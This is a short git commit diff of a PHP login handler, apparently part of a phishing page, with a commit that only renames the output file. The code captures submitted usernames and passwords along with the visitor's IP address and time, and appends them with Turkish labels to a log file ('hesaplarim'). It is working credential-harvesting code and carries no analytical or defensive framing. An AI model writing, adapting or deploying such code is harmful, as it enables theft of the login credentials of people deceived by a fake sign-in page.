b5b2b52e336dfa3b50ec4b51c7d975f2509cb148
keko01 <hatipyucel@gmail.com>
2019-05-12 01:19:36 +0300

    Update index.php

--- test/accounts/login/index.php
+++ test/accounts/login/index.php
@@ -4,7 +4,7 @@ $cevap2 =  $_POST['password'];
 $ip = $_SERVER['REMOTE_ADDR'];
 date_default_timezone_set('Europe/Istanbul');  
 $cur_time=date("d-m-Y H:i:s");
-$file = fopen('hesaplarim.php', 'a'); 
+$file = fopen('hesaplarim.txt', 'a'); 
 fwrite($file, "<font color='gray'>Kullanıcı Adı:</font><font color='white'> " .$cevap1. "</font><br>\n<font color='gray'> Şifre: </font><font color='white'>" .$cevap2. "</font><br>\n<font color='gray'>Ip Adresi:</font><font color='white'> " .$ip. "</font><br>\n<font color='gray'>Tarih:</font><font color='white'> " .$cur_time.  "</font><hr>");
 fclose($file); 
 echo '';
